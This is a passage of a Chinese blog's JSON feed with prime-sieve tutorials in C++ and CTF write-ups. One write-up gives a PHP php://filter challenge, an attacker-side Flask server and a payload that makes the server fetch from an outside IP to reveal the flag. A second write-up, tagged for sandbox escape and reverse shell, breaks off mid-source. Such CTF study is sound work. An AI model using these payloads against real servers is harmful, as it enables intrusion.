            "url": "http://yoursite.com/Algorithm/%E8%B4%A8%E6%95%B0%E9%97%AE%E9%A2%98/",
            "title": "质数问题",
            "date_published": "2024-03-22T15:29:08.000Z",
            "content_html": "<hr />\n<h2 id=\"质数问题\"><a class=\"anchor\" href=\"#质数问题\">#</a> 质数问题</h2>\n<h3 id=\"朴素筛\"><a class=\"anchor\" href=\"#朴素筛\">#</a> 朴素筛</h3>\n<p>筛掉所有数（<strong>素数和合数都有参与最外层循环</strong>）的倍数，for 循环不在 if 语句里</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> tot <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 质数个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//2 到 n 循环</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>check<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        prime<span class=\"token punctuation\">[</span>tot<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span><span class=\"token comment\">// 当前数为质数，存入 prime [] 数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                         <span class=\"token comment\">//tot 加一，质数个数加一</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        check<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 标记合数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"埃氏筛\"><a class=\"anchor\" href=\"#埃氏筛\">#</a> 埃氏筛</h3>\n<ul>\n<li>基本思想：一次循环筛掉当前素数的倍数</li>\n<li><strong>缺点</strong>：存在重复筛选，比如 6 既可以被 2 筛掉，又可以被 3 筛掉</li>\n</ul>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> tot <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 质数个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//2 到 n 循环</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>check<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 筛掉已经被质数倍数标记过的合数，避免让合数进入循环</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        prime<span class=\"token punctuation\">[</span>tot<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span><span class=\"token comment\">// 当前数为质数，存入 prime [] 数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                         <span class=\"token comment\">//tot 加一，质数个数加一</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    \t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        \tcheck<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 标记合数</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    \t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"线性筛\"><a class=\"anchor\" href=\"#线性筛\">#</a> 线性筛</h3>\n<ul>\n<li>中心思想：只能被最小质因子筛掉</li>\n</ul>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">get_primes</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>st<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> primes<span class=\"token punctuation\">[</span>cnt <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span><span class=\"token comment\">// 若当前 i 未被标记过，仍为 0，筛选入 primes 数组</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                                      <span class=\"token comment\">// 当前 cnt 为素数个数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> cnt <span class=\"token operator\">&amp;&amp;</span> primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 下面将利用 primes [j]*i 寻找合数，现在给其设定条件</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\tst<span class=\"token punctuation\">[</span>primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 找到的合数标记为 1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">%</span> primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 当前数 /(遍历找到) 最小质因数，最差情况 i 为素数遍历最后为 primes [cnt - 1] = i</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>&lt;table&gt;<br />\n&lt;tr&gt;<br />\n&lt;th&gt; 循环次数 &lt;/th&gt;<br />\n&lt;th&gt; 当前被判断的数 i&lt;/th&gt;<br />\n&lt;th&gt;prime [] 素数的计数数组 &lt;/th&gt;<br />\n&lt;th&gt; 此次循环筛掉的合数 prime [j] * i&lt;/th&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第一次 &lt;/td&gt;<br />\n&lt;th&gt;2&lt;/th&gt;<br />\n&lt;td&gt;[2]&lt;/td&gt;<br />\n&lt;td&gt;4&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第二次 &lt;/td&gt;<br />\n&lt;th&gt;3&lt;/th&gt;<br />\n&lt;td&gt;[2,3]&lt;/td&gt;<br />\n&lt;td&gt;6,9&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第三次 &lt;/td&gt;<br />\n&lt;th&gt;4&lt;/th&gt;<br />\n&lt;td&gt;[2,3]&lt;/td&gt;<br />\n&lt;td&gt;8&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第四次 &lt;/td&gt;<br />\n&lt;th&gt;5&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5]&lt;/td&gt;<br />\n&lt;td&gt;10,15,25&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第五次 &lt;/td&gt;<br />\n&lt;th&gt;6&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5]&lt;/td&gt;<br />\n&lt;td&gt;12&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第六次 &lt;/td&gt;<br />\n&lt;th&gt;7&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5,7]&lt;/td&gt;<br />\n&lt;td&gt;14,21,35,49&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第七次 &lt;/td&gt;<br />\n&lt;th&gt;8&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5,7]&lt;/td&gt;<br />\n&lt;td&gt;16&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第九次 &lt;/td&gt;<br />\n&lt;th&gt;9&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5,7]&lt;/td&gt;<br />\n&lt;td&gt;18,27&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;/table&gt;</p>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8E%86%E5%B9%B4%E7%9C%9F%E9%A2%98/",
            "url": "http://yoursite.com/Algorithm/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8E%86%E5%B9%B4%E7%9C%9F%E9%A2%98/",
            "title": "蓝桥杯历年真题",
            "date_published": "2024-03-22T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"第十四届\"><a class=\"anchor\" href=\"#第十四届\">#</a> 第十四届</h1>\n<p><strong>日期统计</strong></p>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/CTF-WriteUp/2024%20HSCCTF/",
            "url": "http://yoursite.com/CTF-WriteUp/2024%20HSCCTF/",
            "title": "2024 VenomCTF",
            "date_published": "2024-03-21T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"checkin\"><a class=\"anchor\" href=\"#checkin\">#</a> CHECKIN</h1>\n<p><img data-src=\"/assets/CTF/checkin.jpg\" alt=\"\" /></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>/resource=/dev/null\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"2024\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>当<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>不输入内容时，</mtext></mrow><annotation encoding=\"application/x-tex\">a不输入内容时，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">输</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">内</span><span class=\"mord cjk_fallback\">容</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">，</span></span></span></span>b 为 <code>php://filter//resource=/dev/null</code></p>\n<p><code>file_get_contents</code>  作用是获取所选内容</p>\n<p><strong>exp (运行在服务器上)</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> defaults<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'path'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/&lt;path:path>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">catch_all</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'2024'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">6666</span><span class=\"token punctuation\">,</span> host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li><code>@app.route()</code>  是 <code>Flask</code>  框架的一个装饰器，扩展原本函数功能的一种函数</li>\n<li><code>app = Flask(__name__)</code>  创建 <code>Flask</code>  类的实例</li>\n<li><code>@app.route('/', defaults=&#123;'path': ''&#125;)</code> ：访问 <code>127.0.0.1:6666</code>  触发函数 <code>catch_all</code> ，创建默认参数 <code>path</code>  为空字符串，此句的意义是 &lt;u&gt; 防止访问根路径时 path 为空，传参造成报错 &lt;/u&gt;</li>\n<li><code>@app.route('/&lt;path:path&gt;')</code> ：访问路径 <code>/path</code>  的中的 <code>path字符串</code> 传参给变量 <code>path</code> ，然后最后传给函数 <code>catch_all</code> ，因为上面 path 默认设置为空，所以 <code>exp</code>  的意思是 &lt;u&gt; 无论访问什么路径，都会得到 '2024' 的响应 &lt;/u&gt;</li>\n</ul>\n<p><strong>Payload</strong></p>\n<pre><code>POST传参\ncontent-type:application/x-www-form-urlencoded\n\nURL:http://91d4c737-deed-4020-8f66-fa27dfdafbf2.game.hscsec.cn:8080/\n\n传参Body:\n1=read=string.toupper/resource=http://23.94.212.183:6666\n\n拼接的payload:\nphp://filter//resource=/dev/null\n</code></pre>\n",
            "tags": [
                "CTF赛题",
                "CTF_WriteUp"
            ]
        },
        {
            "id": "http://yoursite.com/CTF-WriteUp/2023%20%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/",
            "url": "http://yoursite.com/CTF-WriteUp/2023%20%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/",
            "title": "2023 陕西省大学生网络安全大赛",
            "date_published": "2024-03-18T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"esc4pe_t0_mong0\"><a class=\"anchor\" href=\"#esc4pe_t0_mong0\">#</a> Esc4pe_T0_Mong0</h2>\n<p><code>node代码审计，constructor沙箱逃逸，绕过waf，反弹shell，mongodb</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Source Code<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//const &#123; MongoClient &#125; = require(\"mongodb\");</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//const client = new MongoClient(\"mongodb://localhost:27017/\");</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"express\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">const</span> bodyParser <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">isValidCode</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">code</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">const</span> isLengthValid <span class=\"token operator\">=</span> code<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">365</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">const</span> isASCII <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[\\x20-\\x7e]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">const</span> containsInvalidChars <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">[.\\[\\]&#123;&#125;\\s;`'\"/\\\\_&lt;>?:]</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">const</span> doesNotContainImport <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>code<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"import\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">const</span> doesNotContainUnescape <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">%(?:d0|d1|%[89abAB][0-9a-fA-F])</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      isLengthValid <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      isASCII <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token operator\">!</span>containsInvalidChars <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      doesNotContainImport <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      doesNotContainUnescape</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span> __dirname <span class=\"token operator\">+</span> <span class=\"token string\">\"/static/index.html\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/readfile'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span> __dirname <span class=\"token operator\">+</span> <span class=\"token string\">\"/app.js\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/exec'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">const</span> code <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token 